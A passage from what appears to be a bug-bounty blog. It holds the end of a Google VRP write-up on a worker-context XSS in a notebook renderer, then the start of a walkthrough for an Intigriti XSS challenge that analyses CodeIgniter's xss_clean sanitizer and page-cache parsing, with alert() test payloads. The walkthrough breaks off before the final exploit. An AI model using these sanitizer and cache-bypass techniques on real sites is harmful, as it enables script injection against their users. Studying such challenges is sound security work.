   </span><span class="nl">"display_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Python 3"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"language"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python3"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"language_info"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="nl">"codemirror_mode"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ipython"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"file_extension"</span><span class="p">:</span><span class="w"> </span><span class="s2">".py"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mimetype"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text/x-python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"nbconvert_exporter"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"pygments_lexer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ipython3"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3.9.6"</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">},</span><span class="w">
 </span><span class="nl">"nbformat"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w">
 </span><span class="nl">"nbformat_minor"</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div>
<p><br />
One thing which I did extra was to make use of <code class="language-plaintext highlighter-rouge">opener</code> property to iframe the vulnerable endpoint  there instead in the same Jupyter notebook renderer if I remember there was still some framing issues I tried going through the chats but I am missing what exactly was the cause which led to this. Well anyways rest of things should be easy to understand</p>

<p>And lastly here‚Äôs the VIDEO POC in action</p>

<center>
<iframe width="560" height="315" src="https://www.youtube.com/embed/s1-2WW8_AHM?si=tr-7rIpo_4MB2yAn" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</center>
<p><br />
<br /></p>

<p>Regarding the impact of this, the xss is in Worker context <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker">https://developer.mozilla.org/en-US/docs/Web/API/Worker</a> , this context doesn‚Äôt have access to properties such as the DOM so proving the impact can be a bit difficult but it does supports fetch api this means you can make requests to read any response or invoke any requests.</p>

<p>Btw what if tell you that there is indeed a way to escalate a Worker  based xss into a full blown one? It‚Äôs not my finding (I am not that skilled) but I can say one thing for sure the technique is super cooooooool :p , I will tag the person here  <a href="https://joaxcar.com/">Johan Carlsson ( @joaxcar )</a> (hehe hope you won‚Äôt mind ) go ahead and force him to write a blogpost about this.</p>

<p>The end result, Google was very generous with the bounty amount they even added a bonus also to this report :)</p>

<p>One of the many reasons why Google VRP is the best program out there</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729220436.png" alt="Pasted image 20250729220436.png" /></p>

<p>If you read till the last , I really appreciate that writing this blogpost really took a lot of time. As this was a finding from one year back I had forgotten most of the things at that time I played with minifies js so my notes were also not proper. For this blogpost as I wanted to explain everything I looked into this bug again and reproduce the bug from scratch which again took quite a time but as this time I had sourcemap with me things were a bit easy and I was able to understand more about how the pieces were moving.</p>

<p>Again I would like thanks Matan for the original discovery of this and also the duo (Sreeram and Sivanesh) without which this bug wouldn‚Äôt be complete :)</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bugbounty" /><category term="xss" /><category term="google" /><category term="vscode" /><summary type="html"><![CDATA[Heyyy Everyyonee,]]></summary></entry><entry><title type="html">Intigriti Xss Challenge Dec 2024 Solution</title><link href="http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html" rel="alternate" type="text/html" title="Intigriti Xss Challenge Dec 2024 Solution" /><published>2024-12-19T00:00:00+05:30</published><updated>2024-12-19T00:00:00+05:30</updated><id>http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution</id><content type="html" xml:base="http://localhost:4000/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html"><![CDATA[<p>This was really an interesting xss challenge by <a href="https://x.com/J0R1AN">@J0R1AN</a>. I solved this challenge  after the challenge deadline was over but still wanted to do a blogpost cause why not :p</p>

<p>The challenge  looks simple at first, you can see there is one parameter <code class="language-plaintext highlighter-rouge">title</code> <a href="https://challenge-1224.intigriti.io/index.php/view?title=shirley%3Cimg%20src=x%20onerrpr=alert()%3E">https://challenge-1224.intigriti.io/index.php/view?title=shirley%3Cimg%20src=x%20onerrpr=alert()%3E</a> whose value is reflected at two places into the page source. We can also noticed that there is some sanitizer which as input was transformed</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
<span class="nt">&lt;img&gt;</span>
</code></pre></div></div>

<p>The first reflection is inside the h1 tag where it‚Äôs html encoded and the second one is inside an attribute surrounded by quotes where we can see it‚Äôs not html encoded.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>shirley<span class="ni">&amp;lt;</span>img<span class="ni">&amp;gt;</span><span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"shirley&lt;img&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>We can‚Äôt breakout of the attribute context because the server doesn‚Äôt allows us to use <code class="language-plaintext highlighter-rouge">"</code> in the <code class="language-plaintext highlighter-rouge">title</code> parameter. As there‚Äôs nothing more into the source now let‚Äôs move on to the source code as we have been provided.</p>

<p><a href="https://challenge-1224.intigriti.io/source.zip">https://challenge-1224.intigriti.io/source.zip</a></p>

<p>It‚Äôs written in PHP using the Codeigniter framework. Let‚Äôs start with looking at the controllers, to get an overview of how the sanitization process is happening and all</p>

<p>We have two controllers Home and View</p>

<p><a href="http://localhost:8002/index.php/home">http://localhost:8002/index.php/home</a></p>

<p><a href="http://localhost:8002/index.php/view">http://localhost:8002/index.php/view</a></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
// source/src/application/controllers/View.php
<span class="cp">&lt;?php</span>
<span class="nb">defined</span><span class="p">(</span><span class="s1">'BASEPATH'</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>

<span class="k">function</span> <span class="n">str2id</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Error: No quotes allowed in attribute'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// Lowercase everything except first letters</span>
    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'/(^)?[A-Z]+/'</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">},</span> <span class="nv">$str</span><span class="p">);</span>
    <span class="c1">// Replace whitespace with dash</span>
    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[\s]/'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">View</span> <span class="kd">extends</span> <span class="nc">CI_Controller</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">index</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'string'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'security'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">output</span><span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

        <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'title'</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">'Christmas Fireplace'</span><span class="p">;</span> <span class="c1">// [1]</span>

        <span class="nv">$title</span> <span class="o">=</span> <span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$title</span><span class="p">);</span>
        <span class="nv">$id</span> <span class="o">=</span> <span class="nf">str2id</span><span class="p">(</span><span class="nv">$title</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">view</span><span class="p">(</span><span class="s1">'view'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">"id"</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">,</span>
            <span class="s2">"title"</span> <span class="o">=&gt;</span> <span class="nv">$title</span>
        <span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>On line [1] we can see it retrieves the value of the <code class="language-plaintext highlighter-rouge">title</code> parameter and the value is passed to <code class="language-plaintext highlighter-rouge">xss_clean</code> method <a href="https://codeigniter.com/userguide3/libraries/security.html">https://codeigniter.com/userguide3/libraries/security.html</a> which comes from the Security Class.
The <code class="language-plaintext highlighter-rouge">str2id</code> method basically checks to ensure there is‚Äônt any <code class="language-plaintext highlighter-rouge">"</code> character in the value , then as from the comments it tries to lowercase everything except first letters and replaces whitespace character with dash.</p>

<p>These two values <code class="language-plaintext highlighter-rouge">$id</code> and <code class="language-plaintext highlighter-rouge">$title</code> are passed to the view template.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
// source/src/application/views/view.php

<span class="nt">&lt;h1&gt;</span><span class="cp">&lt;?=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$title</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"</span><span class="cp">&lt;?=</span> <span class="nv">$id</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>The first reflection point is of not any use as it will be encoded always, the second one is of our interest but as we can‚Äôt use <code class="language-plaintext highlighter-rouge">"</code> we can‚Äôt simply break out of it and try to get xss.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Error: No quotes allowed in attribute'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Rest of the interesting things in source are these things:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'string'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">load</span><span class="o">-&gt;</span><span class="nf">helper</span><span class="p">(</span><span class="s1">'security'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">output</span><span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>

<p>Still we don‚Äôt see any way to breakout of this , I decided to look at this challenge again in a few days and I forgot about it untill the hints were dropped I realised I don‚Äôt have much time now üòÖ.</p>

<p>Anyways from the hint we can see it talks about the cache and the mutate thing.
Mutate is surely related to the <code class="language-plaintext highlighter-rouge">xss_clean</code> method where we can some mutation vector to bypass the sanitizer, the cache thing was related to use of cache function on the site but I couldn‚Äôt figured out what it meant really. I was solving this with my friend @0xbla, which then told me that to check the cache folder as there it stores the rendered page content for templates.
I didn‚Äôt had setup the local environment, so I quickly started one and now I could see the cache files basically they have this format:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// application/cache/52c7c06e8caef34778267035d3d50178

a:2:{s:6:"expire";i:1734579021;s:7:"headers";a:0:{}}ENDCI---&gt;<span class="cp">&lt;!DOCTYPE html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/style.css"</span><span class="nt">&gt;&lt;/head&gt;&lt;body</span> <span class="na">background=</span><span class="s">"#483741"</span> <span class="na">class=</span><span class="s">"fire-border"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/index.php"</span> <span class="na">class=</span><span class="s">"top-left"</span><span class="nt">&gt;</span>‚¨Ö Go back<span class="nt">&lt;/a&gt;&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;&lt;h1&gt;</span>shirley<span class="nt">&lt;/h1&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"wall"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"crown"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"round"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"ball"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"shirley"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"bottom"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"ground"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"top"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"bricks"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney"</span><span class="nt">&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney-shadow"</span><span class="nt">&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"chimney-fire-wrapper"</span><span class="nt">&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"wood"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;ul</span> <span class="na">class=</span><span class="s">"embers"</span><span class="nt">&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span> <span class="na">id=</span><span class="s">"candle-2"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"candle"</span> <span class="na">id=</span><span class="s">"candle-3"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"fire"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span> <span class="na">id=</span><span class="s">"sock-2"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"sock"</span> <span class="na">id=</span><span class="s">"sock-3"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"second"</span><span class="nt">&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span>
</code></pre></div></div>

<p>The format of this cache file looked weird for eg, the starting data is a serialized string and <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> denotes the end of the serialized data. It still wasn‚Äôt clear how the escape route is possible from this untill I started looking at how this cache file content is parsed and the data is returned.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// system/core/Output.php</span>

	<span class="cd">/**
	 * Update/serve cached output
	 *
	 * @uses	CI_Config
	 * @uses	CI_URI
	 *
	 * @param	object	&amp;$CFG	CI_Config class instance
	 * @param	object	&amp;$URI	CI_URI class instance
	 * @return	bool	TRUE on success or FALSE on failure
	 */</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">_display_cache</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$CFG</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$URI</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$cache_path</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_path'</span><span class="p">)</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="o">?</span> <span class="no">APPPATH</span><span class="mf">.</span><span class="s1">'cache/'</span> <span class="o">:</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_path'</span><span class="p">);</span>
		<span class="c1">// Build the file path. The file name is an MD5 hash of the full URI</span>
		<span class="nv">$uri</span> <span class="o">=</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'base_url'</span><span class="p">)</span><span class="mf">.</span><span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'index_page'</span><span class="p">)</span><span class="mf">.</span><span class="nv">$URI</span><span class="o">-&gt;</span><span class="n">uri_string</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">((</span><span class="nv">$cache_query_string</span> <span class="o">=</span> <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="nf">item</span><span class="p">(</span><span class="s1">'cache_query_string'</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]))</span>
		<span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$cache_query_string</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="nv">$uri</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'?'</span><span class="mf">.</span><span class="nb">http_build_query</span><span class="p">(</span><span class="nb">array_intersect_key</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">,</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$cache_query_string</span><span class="p">)));</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="nv">$uri</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'?'</span><span class="mf">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="nv">$filepath</span> <span class="o">=</span> <span class="nv">$cache_path</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$uri</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="k">OR</span> <span class="o">!</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="no">LOCK_SH</span><span class="p">);</span>
		<span class="nv">$cache</span> <span class="o">=</span> <span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
		<span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="no">LOCK_UN</span><span class="p">);</span>
		<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
		<span class="c1">// Look for embedded serialized file info.</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span>   <span class="c1">// [1]</span>
		<span class="p">{</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nv">$cache_info</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="nv">$expire</span> <span class="o">=</span> <span class="nv">$cache_info</span><span class="p">[</span><span class="s1">'expire'</span><span class="p">];</span>
		<span class="nv">$last_modified</span> <span class="o">=</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>

		<span class="c1">// Has the file expired?</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nv">$expire</span> <span class="o">&amp;&amp;</span> <span class="nf">is_really_writable</span><span class="p">(</span><span class="nv">$cache_path</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="c1">// If so we'll delete it.</span>
			<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
			<span class="nf">log_message</span><span class="p">(</span><span class="s1">'debug'</span><span class="p">,</span> <span class="s1">'Cache file has expired. File deleted.'</span><span class="p">);</span>
			<span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="c1">// Send the HTTP cache control headers</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set_cache_header</span><span class="p">(</span><span class="nv">$last_modified</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>

		<span class="c1">// Add headers from cache file.</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$cache_info</span><span class="p">[</span><span class="s1">'headers'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">set_header</span><span class="p">(</span><span class="nv">$header</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$header</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="p">}</span>
		<span class="c1">// Display the cache</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_display</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="k">self</span><span class="o">::</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])));</span>
		<span class="nf">log_message</span><span class="p">(</span><span class="s1">'debug'</span><span class="p">,</span> <span class="s1">'Cache file is current. Sending it to browser.'</span><span class="p">);</span>
		<span class="k">return</span> <span class="kc">TRUE</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>

